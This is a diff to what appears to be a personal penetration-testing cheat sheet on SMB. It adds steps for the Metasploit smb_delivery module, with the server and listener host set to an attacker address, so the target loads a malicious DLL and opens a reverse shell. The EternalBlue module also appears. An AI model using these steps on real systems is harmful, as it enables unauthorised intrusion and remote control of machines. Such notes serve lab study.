@@ -142,6 +142,17 @@ domain=.</code></pre>
                     <pre><code class="language-bash">windows/smb/ms17_010_eternalblue</code></pre>
                 </ul>
 
+                <h3>Getting a shell through smb</h3>
+                <ul>
+                    <p>In case we have shell access to the remote computer and it is a Windows we could get a reverse shell through meterpreter using the following modules</p>
+                    <pre><code class="language-bash">use exploit/windows/smb/smb_delivery</code></pre>
+                    <p>srvhost and lhost the same and type exploit</p>
+                    <pre><code class="language-bash">set srvhost 10.10.14.124
+set lhost 10.10.14.124
+</code></pre>
+                    <p>Then it will give you a command which will performa connection to our SMB server and execute a malicious dll which will make us gain a shell</p>
+                </ul>
+
                 <h3>Path traversal (Situationship)</h3>
                 <ul>
                     <p>In case you found anywhere paths inside the SMB share that you cant no access since you cant list files there is a solution to access</p>
